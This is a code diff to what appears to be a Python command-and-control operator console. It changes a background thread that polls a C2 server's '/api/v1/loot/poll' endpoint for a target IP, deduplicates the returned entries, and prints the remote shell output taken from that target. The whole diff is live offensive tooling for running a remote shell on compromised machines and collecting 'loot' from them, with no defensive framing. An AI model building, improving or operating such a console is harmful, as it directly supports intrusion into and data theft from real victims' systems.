@@ -30,21 +30,24 @@ def main():
     
     # 1. Background thread logic for real-time output
     def fetch_output():
-        nonlocal last_loot_count
+        processed_ids = set()
         while True:
             try:
-                # Poll for diagnostic_blob which contains shell output
                 response = requests.get(f"{c2_url}/api/v1/loot/poll?ip={target_ip}")
                 if response.status_code == 200:
                     data = response.json()
-                    new_items = data.get('items', [])
-                    for item in new_items:
-                        # Clean up formatting for shell display
-                        clean_item = item.split(">>")[-1].strip()
-                        print(f"{Fore.GREEN}{clean_item}{Style.RESET_ALL}", end="")
+                    new_entries = data.get('items', [])
+                    for entry in new_entries:
+                        entry_id = entry.get('id')
+                        if entry_id not in processed_ids:
+                            # [ENI'S SYNC] Split on the '>>' marker to get the raw shell output
+                            raw_content = entry.get('data', "").split(">>")[-1].strip()
+                            if raw_content:
+                                print(f"\n{Fore.GREEN}{raw_content}{Style.RESET_ALL}")
+                            processed_ids.add(entry_id)
             except Exception:
                 pass
-            time.sleep(0.5)
+            time.sleep(1)
 
     import threading
     threading.Thread(target=fetch_output, daemon=True).start()
